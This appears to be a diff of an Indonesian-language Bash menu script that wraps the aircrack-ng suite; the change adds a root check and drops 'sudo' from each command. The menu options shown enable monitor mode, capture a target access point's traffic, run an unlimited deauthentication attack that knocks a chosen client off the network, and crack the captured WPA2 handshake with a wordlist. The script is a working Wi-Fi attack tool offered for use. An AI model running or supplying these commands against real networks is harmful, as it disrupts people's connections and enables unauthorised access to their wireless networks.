@@ -1,5 +1,10 @@
 #!/bin/bash
 
+if [ "$EUID" -ne 0 ]; then
+  echo "Skrip ini harus dijalankan sebagai root."
+  exit 1
+fi
+
 # Mendapatkan waktu saat ini
 current_time=$(date +"%A, %d %B %Y %T")
 
@@ -98,12 +103,12 @@ while true; do
   case $choice in
     1)
       # Aktifkan Mode Monitor
-      sudo airmon-ng start "${interface}"
+      airmon-ng start "${interface}"
       read -p "Tekan tombol [Enter] untuk melanjutkan..."
       ;;
     2)
       # Nonaktifkan Mode Monitor
-      sudo airmon-ng stop "${interface}"
+      airmon-ng stop "${interface}"
       read -p "Tekan tombol [Enter] untuk melanjutkan..."
       ;;
     3)
@@ -112,21 +117,21 @@ while true; do
       read -p "Masukkan MAC Address dari Access Point: " target_bssid
       read -p "Masukkan channel: " channel
       read -p "Masukkan nama file output: " output_file
-      sudo airodump-ng --bssid "${target_bssid}" --channel "${channel}" -w "${output_file}" "${interface}"
+      airodump-ng --bssid "${target_bssid}" --channel "${channel}" -w "${output_file}" "${interface}"
       read -p "Tekan tombol [Enter] untuk melanjutkan..."
       ;;
     4)
       # Injeksi Paket Wi-Fi
       read -p "Masukkan MAC Address dari Access Point: " ap
       read -p "Masukkan MAC Address dari client:" client
-      sudo aireplay-ng -0 0 -a "${ap}" -c "${client}" "${interface}"
+      aireplay-ng -0 0 -a "${ap}" -c "${client}" "${interface}"
       read -p "Tekan tombol [Enter] untuk melanjutkan..."
       ;;
     5)
       # Retas Kunci Wi-Fi
       read -p "Masukkan nama file handshake: " file_handshake
       read -p "Masukkan file wordlist: " file_wordlist
-      sudo aircrack-ng -a2 -w "${file_wordlist}" "$file_handshake"
+      aircrack-ng -a2 -w "${file_wordlist}" "$file_handshake"
       read -p "Tekan tombol [Enter] untuk melanjutkan..."
       ;;
     6)
